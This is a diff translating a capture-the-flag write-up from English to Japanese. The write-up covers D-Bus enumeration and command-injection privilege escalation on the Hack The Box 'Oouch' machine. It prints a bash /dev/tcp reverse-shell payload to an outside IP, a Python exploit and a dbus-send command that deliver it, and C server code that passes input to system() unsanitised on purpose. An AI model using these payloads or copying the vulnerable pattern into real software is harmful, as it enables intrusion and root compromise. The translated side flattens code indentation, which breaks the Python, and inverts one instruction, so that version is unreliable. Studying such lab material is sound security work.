@@ -1,39 +1,36 @@
-# D-Bus Enumeration & Command Injection Privilege Escalation
+# D-Busの列挙とコマンドインジェクションによる特権昇格
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## **GUI enumeration**
+## **GUI列挙**
 
-D-Bus is utilized as the inter-process communications (IPC) mediator in Ubuntu desktop environments. On Ubuntu, the concurrent operation of several message buses is observed: the system bus, primarily utilized by **privileged services to expose services relevant across the system**, and a session bus for each logged-in user, exposing services relevant only to that specific user. The focus here is primarily on the system bus due to its association with services running at higher privileges (e.g., root) as our objective is to elevate privileges. It is noted that D-Bus's architecture employs a 'router' per session bus, which is responsible for redirecting client messages to the appropriate services based on the address specified by the clients for the service they wish to communicate with.
+D-Busは、Ubuntuデスクトップ環境におけるプロセス間通信（IPC）の仲介者として利用されています。Ubuntuでは、いくつかのメッセージバスが同時に動作しているのが観察されます：システムバスは主に**特権サービスがシステム全体に関連するサービスを公開するために利用され**、各ログインユーザーのためのセッションバスは、その特定のユーザーにのみ関連するサービスを公開します。ここでは、特権を昇格させることを目的としているため、特権の高いサービス（例：root）で動作することに関連するシステムバスに主に焦点を当てています。D-Busのアーキテクチャは、各セッションバスごとに「ルーター」を採用しており、クライアントが通信したいサービスのために指定したアドレスに基づいて、クライアントメッセージを適切なサービスにリダイレクトする役割を担っています。
 
-Services on D-Bus are defined by the **objects** and **interfaces** they expose. Objects can be likened to class instances in standard OOP languages, with each instance uniquely identified by an **object path**. This path, akin to a filesystem path, uniquely identifies each object exposed by the service. A key interface for research purposes is the **org.freedesktop.DBus.Introspectable** interface, featuring a singular method, Introspect. This method returns an XML representation of the object's supported methods, signals, and properties, with a focus here on methods while omitting properties and signals.
+D-Bus上のサービスは、**オブジェクト**と**インターフェース**によって定義されます。オブジェクトは、標準的なOOP言語におけるクラスインスタンスに似ており、各インスタンスは**オブジェクトパス**によって一意に識別されます。このパスは、ファイルシステムパスに似ており、サービスによって公開される各オブジェクトを一意に識別します。研究目的での重要なインターフェースは、**org.freedesktop.DBus.Introspectable**インターフェースであり、単一のメソッドIntrospectを特徴としています。このメソッドは、オブジェクトがサポートするメソッド、シグナル、およびプロパティのXML表現を返し、ここではプロパティとシグナルを省略してメソッドに焦点を当てています。
 
-For communication with the D-Bus interface, two tools were employed: a CLI tool named **gdbus** for easy invocation of methods exposed by D-Bus in scripts, and [**D-Feet**](https://wiki.gnome.org/Apps/DFeet), a Python-based GUI tool designed to enumerate the services available on each bus and to display the objects contained within each service.
-
+D-Busインターフェースとの通信には、2つのツールが使用されました：D-Busによって公開されるメソッドをスクリプトで簡単に呼び出すためのCLIツール**gdbus**と、各バスで利用可能なサービスを列挙し、各サービスに含まれるオブジェクトを表示するために設計されたPythonベースのGUIツール[**D-Feet**](https://wiki.gnome.org/Apps/DFeet)です。
 ```bash
 sudo apt-get install d-feet
 ```
-
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-21.png)
 
 ![https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png](https://unit42.paloaltonetworks.com/wp-content/uploads/2019/07/word-image-22.png)
 
-In the first image services registered with the D-Bus system bus are shown, with **org.debin.apt** specifically highlighted after selecting the System Bus button. D-Feet queries this service for objects, displaying interfaces, methods, properties, and signals for chosen objects, seen in the second image. Each method's signature is also detailed.
+最初の画像には、D-Busシステムバスに登録されたサービスが表示されており、**org.debin.apt**がシステムバスボタンを選択した後に特に強調表示されています。D-Feetはこのサービスに対してオブジェクトをクエリし、選択されたオブジェクトのインターフェース、メソッド、プロパティ、およびシグナルを表示します。これが2番目の画像で確認できます。各メソッドのシグネチャも詳細に記載されています。
 
-A notable feature is the display of the service's **process ID (pid)** and **command line**, useful for confirming if the service runs with elevated privileges, important for research relevance.
+注目すべき特徴は、サービスの**プロセスID（pid）**と**コマンドライン**が表示されることで、サービスが昇格した特権で実行されているかどうかを確認するのに役立ちます。これは研究の関連性にとって重要です。
 
-**D-Feet also allows method invocation**: users can input Python expressions as parameters, which D-Feet converts to D-Bus types before passing to the service.
+**D-Feetはメソッドの呼び出しも可能です**：ユーザーはパラメータとしてPython式を入力でき、D-FeetはそれをD-Busタイプに変換してサービスに渡します。
 
-However, note that **some methods require authentication** before allowing us to invoke them. We will ignore these methods, since our goal is to elevate our privileges without credentials in the first place.
+ただし、**いくつかのメソッドは認証を必要とします**。これらのメソッドは無視します。なぜなら、私たちの目標は最初から資格情報なしで特権を昇格させることだからです。
 
-Also note that some of the services query another D-Bus service named org.freedeskto.PolicyKit1 whether a user should be allowed to perform certain actions or not.
+また、いくつかのサービスは、ユーザーが特定のアクションを実行することを許可されるべきかどうかを確認するために、別のD-Busサービスであるorg.freedeskto.PolicyKit1にクエリを送信することに注意してください。
 
 ## **Cmd line Enumeration**
 
-### List Service Objects
+### サービスオブジェクトのリスト
 
-It's possible to list opened D-Bus interfaces with:
-
+開いているD-Busインターフェースをリストすることが可能です：
 ```bash
 busctl list #List D-Bus interfaces
 
@@ -57,15 +54,13 @@ org.freedesktop.PolicyKit1               - -               -                (act
 org.freedesktop.hostname1                - -               -                (activatable) -                         -
 org.freedesktop.locale1                  - -               -                (activatable) -                         -
 ```
+#### 接続
 
-#### Connections
+[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) プロセスがバスへの接続を設定すると、バスはその接続に _unique connection name_ と呼ばれる特別なバス名を割り当てます。このタイプのバス名は不変であり、接続が存在する限り変更されないことが保証されています。さらに重要なことに、バスの寿命中に再利用されることはありません。つまり、同じプロセスがバスへの接続を閉じて新しい接続を作成しても、そのバスへの他の接続にそのようなユニークな接続名が割り当てられることは決してありません。ユニークな接続名は、通常禁止されているコロン文字で始まるため、簡単に認識できます。
 
-[From wikipedia:](https://en.wikipedia.org/wiki/D-Bus) When a process sets up a connection to a bus, the bus assigns to the connection a special bus name called _unique connection name_. Bus names of this type are immutable—it's guaranteed they won't change as long as the connection exists—and, more importantly, they can't be reused during the bus lifetime. This means that no other connection to that bus will ever have assigned such unique connection name, even if the same process closes down the connection to the bus and creates a new one. Unique connection names are easily recognizable because they start with the—otherwise forbidden—colon character.
+### サービスオブジェクト情報
 
-### Service Object Info
-
-Then, you can obtain some information about the interface with:
-
+次に、インターフェースに関する情報を取得できます:
 ```bash
 busctl status htb.oouch.Block #Get info of "htb.oouch.Block" interface
 
@@ -94,54 +89,50 @@ AuditLoginUID=n/a
 AuditSessionID=n/a
 UniqueName=:1.3
 EffectiveCapabilities=cap_chown cap_dac_override cap_dac_read_search
-        cap_fowner cap_fsetid cap_kill cap_setgid
-        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
-        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
-        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
-        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
-        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
-        cap_mknod cap_lease cap_audit_write cap_audit_control
-        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
-        cap_wake_alarm cap_block_suspend cap_audit_read
+cap_fowner cap_fsetid cap_kill cap_setgid
+cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+cap_mknod cap_lease cap_audit_write cap_audit_control
+cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+cap_wake_alarm cap_block_suspend cap_audit_read
 PermittedCapabilities=cap_chown cap_dac_override cap_dac_read_search
-        cap_fowner cap_fsetid cap_kill cap_setgid
-        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
-        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
-        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
-        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
-        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
-        cap_mknod cap_lease cap_audit_write cap_audit_control
-        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
-        cap_wake_alarm cap_block_suspend cap_audit_read
+cap_fowner cap_fsetid cap_kill cap_setgid
+cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+cap_mknod cap_lease cap_audit_write cap_audit_control
+cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+cap_wake_alarm cap_block_suspend cap_audit_read
 InheritableCapabilities=
 BoundingCapabilities=cap_chown cap_dac_override cap_dac_read_search
-        cap_fowner cap_fsetid cap_kill cap_setgid
-        cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
-        cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
-        cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
-        cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
-        cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
-        cap_mknod cap_lease cap_audit_write cap_audit_control
-        cap_setfcap cap_mac_override cap_mac_admin cap_syslog
-        cap_wake_alarm cap_block_suspend cap_audit_read
+cap_fowner cap_fsetid cap_kill cap_setgid
+cap_setuid cap_setpcap cap_linux_immutable cap_net_bind_service
+cap_net_broadcast cap_net_admin cap_net_raw cap_ipc_lock
+cap_ipc_owner cap_sys_module cap_sys_rawio cap_sys_chroot
+cap_sys_ptrace cap_sys_pacct cap_sys_admin cap_sys_boot
+cap_sys_nice cap_sys_resource cap_sys_time cap_sys_tty_config
+cap_mknod cap_lease cap_audit_write cap_audit_control
+cap_setfcap cap_mac_override cap_mac_admin cap_syslog
+cap_wake_alarm cap_block_suspend cap_audit_read
 ```
+### サービスオブジェクトのインターフェースをリストする
 
-### List Interfaces of a Service Object
-
-You need to have enough permissions.
-
+十分な権限が必要です。
 ```bash
 busctl tree htb.oouch.Block #Get Interfaces of the service object
 
 └─/htb
-  └─/htb/oouch
-    └─/htb/oouch/Block
+└─/htb/oouch
+└─/htb/oouch/Block
 ```
+### サービスオブジェクトのインターフェースを調査する
 
-### Introspect Interface of a Service Object
-
-Note how in this example it was selected the latest interface discovered using the `tree` parameter (_see previous section_):
-
+この例では、`tree`パラメーターを使用して発見された最新のインターフェースが選択されたことに注意してください（_前のセクションを参照_）：
 ```bash
 busctl introspect htb.oouch.Block /htb/oouch/Block #Get methods of the interface
 
@@ -159,59 +150,51 @@ org.freedesktop.DBus.Properties     interface -         -            -
 .Set                                method    ssv       -            -
 .PropertiesChanged                  signal    sa{sv}as  -            -
 ```
+メソッド `.Block` のインターフェース `htb.oouch.Block` に注意してください（私たちが興味を持っているものです）。他の列の "s" は、文字列を期待していることを意味するかもしれません。
 
-Note the method `.Block` of the interface `htb.oouch.Block` (the one we are interested in). The "s" of the other columns may mean that it's expecting a string.
+### モニター/キャプチャインターフェース
 
-### Monitor/Capture Interface
+十分な権限があれば（`send_destination` と `receive_sender` の権限だけでは不十分です）、**D-Bus通信をモニター**できます。
 
-With enough privileges (just `send_destination` and `receive_sender` privileges aren't enough) you can **monitor a D-Bus communication**.
-
-In order to **monitor** a **communication** you will need to be **root.** If you still find problems being root check [https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) and [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus)
+**通信をモニター**するには、**root**である必要があります。まだrootで問題がある場合は、[https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/](https://piware.de/2013/09/how-to-watch-system-d-bus-method-calls/) と [https://wiki.ubuntu.com/DebuggingDBus](https://wiki.ubuntu.com/DebuggingDBus) を確認してください。
 
 > [!WARNING]
-> If you know how to configure a D-Bus config file to **allow non root users to sniff** the communication please **contact me**!
+> D-Bus設定ファイルを構成して**非rootユーザーが通信をスニッフィングできるようにする方法**を知っている場合は、ぜひ**ご連絡ください**！
 
-Different ways to monitor:
-
+モニターするための異なる方法：
 ```bash
 sudo busctl monitor htb.oouch.Block #Monitor only specified
 sudo busctl monitor #System level, even if this works you will only see messages you have permissions to see
 sudo dbus-monitor --system #System level, even if this works you will only see messages you have permissions to see
 ```
-
-In the following example the interface `htb.oouch.Block` is monitored and **the message "**_**lalalalal**_**" is sent through miscommunication**:
-
+次の例では、インターフェース `htb.oouch.Block` が監視されており、**メッセージ "**_**lalalalal**_**" が誤通信を通じて送信されます**:
 ```bash
 busctl monitor htb.oouch.Block
 
 Monitoring bus message stream.
 ‣ Type=method_call  Endian=l  Flags=0  Version=1  Priority=0 Cookie=2
-  Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
-  UniqueName=:1.1376
-  MESSAGE "s" {
-          STRING "lalalalal";
-  };
+Sender=:1.1376  Destination=htb.oouch.Block  Path=/htb/oouch/Block  Interface=htb.oouch.Block  Member=Block
+UniqueName=:1.1376
+MESSAGE "s" {
+STRING "lalalalal";
+};
 
 ‣ Type=method_return  Endian=l  Flags=1  Version=1  Priority=0 Cookie=16  ReplyCookie=2
-  Sender=:1.3  Destination=:1.1376
-  UniqueName=:1.3
-  MESSAGE "s" {
-          STRING "Carried out :D";
-  };
+Sender=:1.3  Destination=:1.1376
+UniqueName=:1.3
+MESSAGE "s" {
+STRING "Carried out :D";
+};
 ```
+`capture`の代わりに`monitor`を使用して、結果をpcapファイルに保存できます。
 
-You can use `capture` instead of `monitor` to save the results in a pcap file.
+#### ノイズをすべてフィルタリングする <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
 
-#### Filtering all the noise <a href="#filtering_all_the_noise" id="filtering_all_the_noise"></a>
-
-If there is just too much information on the bus, pass a match rule like so:
-
+バス上に情報が多すぎる場合は、次のようにマッチルールを渡します:
 ```bash
 dbus-monitor "type=signal,sender='org.gnome.TypingMonitor',interface='org.gnome.TypingMonitor'"
 ```
-
-Multiple rules can be specified. If a message matches _any_ of the rules, the message will be printed. Like so:
-
+複数のルールを指定できます。メッセージが_いずれか_のルールに一致する場合、そのメッセージが印刷されます。次のように:
 ```bash
 dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```
@@ -219,83 +202,73 @@ dbus-monitor "type=error" "sender=org.freedesktop.SystemToolsBackends"
 ```bash
 dbus-monitor "type=method_call" "type=method_return" "type=error"
 ```
+[D-Busのドキュメント](http://dbus.freedesktop.org/doc/dbus-specification.html)を参照して、マッチルールの構文に関する詳細情報を確認してください。
 
-See the [D-Bus documentation](http://dbus.freedesktop.org/doc/dbus-specification.html) for more information on match rule syntax.
+### もっと
 
-### More
+`busctl`にはさらに多くのオプションがあります。[**ここですべて見つけることができます**](https://www.freedesktop.org/software/systemd/man/busctl.html)。
 
-`busctl` has even more options, [**find all of them here**](https://www.freedesktop.org/software/systemd/man/busctl.html).
+## **脆弱なシナリオ**
 
-## **Vulnerable Scenario**
-
-As user **qtc inside the host "oouch" from HTB** you can find an **unexpected D-Bus config file** located in _/etc/dbus-1/system.d/htb.oouch.Block.conf_:
-
+ユーザー**qtcがHTBのホスト「oouch」内にいる場合**、_ /etc/dbus-1/system.d/htb.oouch.Block.conf _にある**予期しないD-Bus設定ファイル**を見つけることができます。
 ```xml
 <?xml version="1.0" encoding="UTF-8"?> <!-- -*- XML -*- -->
 
 <!DOCTYPE busconfig PUBLIC
- "-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
- "http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
+"-//freedesktop//DTD D-BUS Bus Configuration 1.0//EN"
+"http://www.freedesktop.org/standards/dbus/1.0/busconfig.dtd">
 
 <busconfig>
 
-    <policy user="root">
-        <allow own="htb.oouch.Block"/>
-    </policy>
+<policy user="root">
+<allow own="htb.oouch.Block"/>
+</policy>
 
-	<policy user="www-data">
-		<allow send_destination="htb.oouch.Block"/>
-		<allow receive_sender="htb.oouch.Block"/>
-	</policy>
+<policy user="www-data">
+<allow send_destination="htb.oouch.Block"/>
+<allow receive_sender="htb.oouch.Block"/>
+</policy>
 
 </busconfig>
 ```
+以前の設定から、**このD-BUS通信を介して情報を送受信するには、`root`または`www-data`ユーザーである必要があります**。
 
-Note from the previous configuration that **you will need to be the user `root` or `www-data` to send and receive information** via this D-BUS communication.
-
-As user **qtc** inside the docker container **aeb4525789d8** you can find some dbus related code in the file _/code/oouch/routes.py._ This is the interesting code:
-
+Dockerコンテナ**aeb4525789d8**内のユーザー**qtc**として、ファイル_/code/oouch/routes.py_にいくつかのdbus関連のコードがあります。これが興味深いコードです：
 ```python
 if primitive_xss.search(form.textfield.data):
-        bus = dbus.SystemBus()
-        block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
-        block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
+bus = dbus.SystemBus()
+block_object = bus.get_object('htb.oouch.Block', '/htb/oouch/Block')
+block_iface = dbus.Interface(block_object, dbus_interface='htb.oouch.Block')
 
-        client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
-        response = block_iface.Block(client_ip)
-        bus.close()
-        return render_template('hacker.html', title='Hacker')
+client_ip = request.environ.get('REMOTE_ADDR', request.remote_addr)
+response = block_iface.Block(client_ip)
+bus.close()
+return render_template('hacker.html', title='Hacker')
 ```
+ご覧のとおり、**D-Busインターフェースに接続**し、**「Block」関数**に「client_ip」を送信しています。
 
-As you can see, it is **connecting to a D-Bus interface** and sending to the **"Block" function** the "client_ip".
+D-Bus接続の反対側には、Cでコンパイルされたバイナリが実行されています。このコードは、D-Bus接続で**IPアドレスをリッスン**し、与えられたIPアドレスをブロックするために`system`関数を介してiptablesを呼び出しています。\
+**`system`への呼び出しは意図的にコマンドインジェクションに対して脆弱であり**、次のようなペイロードがリバースシェルを作成します: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
 
-In the other side of the D-Bus connection there is some C compiled binary running. This code is **listening** in the D-Bus connection **for IP address and is calling iptables via `system` function** to block the given IP address.\
-**The call to `system` is vulnerable on purpose to command injection**, so a payload like the following one will create a reverse shell: `;bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #`
+### これを悪用する
 
-### Exploit it
-
-At the end of this page you can find the **complete C code of the D-Bus application**. Inside of it you can find between the lines 91-97 **how the `D-Bus object path`** **and `interface name`** are **registered**. This information will be necessary to send information to the D-Bus connection:
-
+このページの最後に、**D-Busアプリケーションの完全なCコード**があります。その中には、91行目から97行目の間に**`D-Busオブジェクトパス`** **と`インターフェース名`**が**登録されている**方法が記載されています。この情報は、D-Bus接続に情報を送信するために必要です:
 ```c
-        /* Install the object */
-        r = sd_bus_add_object_vtable(bus,
-                                     &slot,
-                                     "/htb/oouch/Block",  /* interface */
-                                     "htb.oouch.Block",   /* service object */
-                                     block_vtable,
-                                     NULL);
+/* Install the object */
+r = sd_bus_add_object_vtable(bus,
+&slot,
+"/htb/oouch/Block",  /* interface */
+"htb.oouch.Block",   /* service object */
+block_vtable,
+NULL);
 ```
-
-Also, in line 57 you can find that **the only method registered** for this D-Bus communication is called `Block`(_**Thats why in the following section the payloads are going to be sent to the service object `htb.oouch.Block`, the interface `/htb/oouch/Block` and the method name `Block`**_):
-
+また、57行目には**このD-Bus通信に登録されている唯一のメソッド**が`Block`と呼ばれていることがわかります(_**そのため、次のセクションではペイロードがサービスオブジェクト`htb.oouch.Block`、インターフェース`/htb/oouch/Block`、およびメソッド名`Block`に送信されます**_):
 ```c
 SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
 ```
-
 #### Python
 
-The following python code will send the payload to the D-Bus connection to the `Block` method via `block_iface.Block(runme)` (_note that it was extracted from the previous chunk of code_):
-
+次のpythonコードは、`block_iface.Block(runme)`を介して`Block`メソッドにペイロードをD-Bus接続に送信します（_これは前のコードのチャンクから抽出されたことに注意してください_）：
 ```python
 import dbus
 bus = dbus.SystemBus()
@@ -305,24 +278,20 @@ runme = ";bash -c 'bash -i >& /dev/tcp/10.10.14.44/9191 0>&1' #"
 response = block_iface.Block(runme)
 bus.close()
 ```
-
-#### busctl and dbus-send
-
+#### busctl と dbus-send
 ```bash
 dbus-send --system --print-reply --dest=htb.oouch.Block /htb/oouch/Block htb.oouch.Block.Block string:';pring -c 1 10.10.14.44 #'
 ```
+- `dbus-send` は「Message Bus」にメッセージを送信するためのツールです。
+- Message Bus – システムがアプリケーション間の通信を容易にするために使用するソフトウェアです。これはメッセージキューに関連しています（メッセージは順序通りに並べられます）が、Message Busではメッセージはサブスクリプションモデルで送信され、非常に迅速です。
+- “-system” タグは、セッションメッセージではなくシステムメッセージであることを示すために使用されます（デフォルト）。
+- “–print-reply” タグは、メッセージを適切に印刷し、人間が読みやすい形式で返信を受け取るために使用されます。
+- “–dest=Dbus-Interface-Block” Dbusインターフェースのアドレスです。
+- “–string:” – インターフェースに送信したいメッセージのタイプです。メッセージを送信するための形式には、ダブル、バイト、ブール値、整数、オブジェクトパスなどがあります。この中で、「オブジェクトパス」はファイルのパスをDbusインターフェースに送信したいときに便利です。この場合、特別なファイル（FIFO）を使用して、ファイルの名前でインターフェースにコマンドを渡すことができます。“string:;” – これはFIFOリバースシェルファイル/コマンドの場所を指定してオブジェクトパスを再度呼び出すためのものです。
 
-- `dbus-send` is a tool used to send message to “Message Bus”
-- Message Bus – A software used by systems to make communications between applications easily. It’s related to Message Queue (messages are ordered in sequence) but in Message Bus the messages are sending in a subscription model and also very quick.
-- “-system” tag is used to mention that it is a system message, not a session message (by default).
-- “–print-reply” tag is used to print our message appropriately and receives any replies in a human-readable format.
-- “–dest=Dbus-Interface-Block” The address of the Dbus interface.
-- “–string:” – Type of message we like to send to the interface. There are several formats of sending messages like double, bytes, booleans, int, objpath. Out of this, the “object path” is useful when we want to send a path of a file to the Dbus interface. We can use a special file (FIFO) in this case to pass a command to interface in the name of a file. “string:;” – This is to call the object path again where we place of FIFO reverse shell file/command.
-
-_Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) references the service object and the last part (`.Block`) references the method name._
+_`htb.oouch.Block.Block` では、最初の部分（`htb.oouch.Block`）がサービスオブジェクトを参照し、最後の部分（`.Block`）がメソッド名を参照していることに注意してください。_
 
 ### C code
-
 ```c:d-bus_server.c
 //sudo apt install pkgconf
 //sudo apt install libsystemd-dev
@@ -336,135 +305,134 @@ _Note that in `htb.oouch.Block.Block`, the first part (`htb.oouch.Block`) refere
 #include <systemd/sd-bus.h>
 
 static int method_block(sd_bus_message *m, void *userdata, sd_bus_error *ret_error) {
-        char* host = NULL;
-        int r;
+char* host = NULL;
+int r;
 
-        /* Read the parameters */
-        r = sd_bus_message_read(m, "s", &host);
-        if (r < 0) {
-                fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
-                return r;
-        }
+/* Read the parameters */
+r = sd_bus_message_read(m, "s", &host);
+if (r < 0) {
+fprintf(stderr, "Failed to obtain hostname: %s\n", strerror(-r));
+return r;
+}
 
-        char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";
+char command[] = "iptables -A PREROUTING -s %s -t mangle -j DROP";
 
-        int command_len = strlen(command);
-        int host_len = strlen(host);
+int command_len = strlen(command);
+int host_len = strlen(host);
 
-        char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
-        if(command_buffer == NULL) {
-                fprintf(stderr, "Failed to allocate memory\n");
-                return -1;
-        }
+char* command_buffer = (char *)malloc((host_len + command_len) * sizeof(char));
+if(command_buffer == NULL) {
+fprintf(stderr, "Failed to allocate memory\n");
+return -1;
+}
 
-        sprintf(command_buffer, command, host);
+sprintf(command_buffer, command, host);
 
-        /* In the first implementation, we simply ran command using system(), since the expected DBus
-         * to be threading automatically. However, DBus does not thread and the application will hang
-         * forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
-         * multithreading)
-         */
-        int pid = fork();
+/* In the first implementation, we simply ran command using system(), since the expected DBus
+* to be threading automatically. However, DBus does not thread and the application will hang
+* forever if some user spawns a shell. Thefore we need to fork (easier than implementing real
+* multithreading)
+*/
+int pid = fork();
 
-        if ( pid == 0 ) {
-            /* Here we are in the child process. We execute the command and eventually exit. */
-            system(command_buffer);
-            exit(0);
-        } else {
-            /* Here we are in the parent process or an error occured. We simply send a genric message.
-             * In the first implementation we returned separate error messages for success or failure.
-             * However, now we cannot wait for results of the system call. Therefore we simply return
-             * a generic. */
-            return sd_bus_reply_method_return(m, "s", "Carried out :D");
-        }
-        r = system(command_buffer);
+if ( pid == 0 ) {
+/* Here we are in the child process. We execute the command and eventually exit. */
+system(command_buffer);
+exit(0);
+} else {
+/* Here we are in the parent process or an error occured. We simply send a genric message.
+* In the first implementation we returned separate error messages for success or failure.
+* However, now we cannot wait for results of the system call. Therefore we simply return
+* a generic. */
+return sd_bus_reply_method_return(m, "s", "Carried out :D");
+}
+r = system(command_buffer);
 }
 
 
 /* The vtable of our little object, implements the net.poettering.Calculator interface */
 static const sd_bus_vtable block_vtable[] = {
-        SD_BUS_VTABLE_START(0),
-        SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
-        SD_BUS_VTABLE_END
+SD_BUS_VTABLE_START(0),
+SD_BUS_METHOD("Block", "s", "s", method_block, SD_BUS_VTABLE_UNPRIVILEGED),
+SD_BUS_VTABLE_END
 };
 
 
 int main(int argc, char *argv[]) {
-        /*
-         * Main method, registeres the htb.oouch.Block service on the system dbus.
-         *
-         * Paramaters:
-         *      argc            (int)             Number of arguments, not required
-         *      argv[]          (char**)          Argument array, not required
-         *
-         * Returns:
-         *      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
-         *      as long as the user keeps it alive.
-         */
+/*
+* Main method, registeres the htb.oouch.Block service on the system dbus.
+*
+* Paramaters:
+*      argc            (int)             Number of arguments, not required
+*      argv[]          (char**)          Argument array, not required
+*
+* Returns:
+*      Either EXIT_SUCCESS ot EXIT_FAILURE. Howeverm ideally it stays alive
+*      as long as the user keeps it alive.
+*/
 
 
-        /* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
-        signal(SIGCHLD,SIG_IGN);
+/* To prevent a huge numer of defunc process inside the tasklist, we simply ignore client signals */
+signal(SIGCHLD,SIG_IGN);
 
-        sd_bus_slot *slot = NULL;
-        sd_bus *bus = NULL;
-        int r;
+sd_bus_slot *slot = NULL;
+sd_bus *bus = NULL;
+int r;
 
-        /* First we need to connect to the system bus. */
-        r = sd_bus_open_system(&bus);
-        if (r < 0)
-        {
-                fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
-                goto finish;
-        }
+/* First we need to connect to the system bus. */
+r = sd_bus_open_system(&bus);
+if (r < 0)
+{
+fprintf(stderr, "Failed to connect to system bus: %s\n", strerror(-r));
+goto finish;
+}
 
-        /* Install the object */
-        r = sd_bus_add_object_vtable(bus,
-                                     &slot,
-                                     "/htb/oouch/Block",  /* interface */
-                                     "htb.oouch.Block",   /* service object */
-                                     block_vtable,
-                                     NULL);
-        if (r < 0) {
-                fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
-                goto finish;
-        }
+/* Install the object */
+r = sd_bus_add_object_vtable(bus,
+&slot,
+"/htb/oouch/Block",  /* interface */
+"htb.oouch.Block",   /* service object */
+block_vtable,
+NULL);
+if (r < 0) {
+fprintf(stderr, "Failed to install htb.oouch.Block: %s\n", strerror(-r));
+goto finish;
+}
 
-        /* Register the service name to find out object */
-        r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
-        if (r < 0) {
-                fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
-                goto finish;
-        }
+/* Register the service name to find out object */
+r = sd_bus_request_name(bus, "htb.oouch.Block", 0);
+if (r < 0) {
+fprintf(stderr, "Failed to acquire service name: %s\n", strerror(-r));
+goto finish;
+}
 
-        /* Infinite loop to process the client requests */
-        for (;;) {
-                /* Process requests */
-                r = sd_bus_process(bus, NULL);
-                if (r < 0) {
-                        fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
-                        goto finish;
-                }
-                if (r > 0) /* we processed a request, try to process another one, right-away */
-                        continue;
+/* Infinite loop to process the client requests */
+for (;;) {
+/* Process requests */
+r = sd_bus_process(bus, NULL);
+if (r < 0) {
+fprintf(stderr, "Failed to process bus: %s\n", strerror(-r));
+goto finish;
+}
+if (r > 0) /* we processed a request, try to process another one, right-away */
+continue;
 
-                /* Wait for the next request to process */
-                r = sd_bus_wait(bus, (uint64_t) -1);
-                if (r < 0) {
-                        fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
-                        goto finish;
-                }
-        }
+/* Wait for the next request to process */
+r = sd_bus_wait(bus, (uint64_t) -1);
+if (r < 0) {
+fprintf(stderr, "Failed to wait on bus: %s\n", strerror(-r));
+goto finish;
+}
+}
 
 finish:
-        sd_bus_slot_unref(slot);
-        sd_bus_unref(bus);
+sd_bus_slot_unref(slot);
+sd_bus_unref(bus);
 
-        return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
+return r < 0 ? EXIT_FAILURE : EXIT_SUCCESS;
 }
 ```
-
-## References
+## 参考文献
 
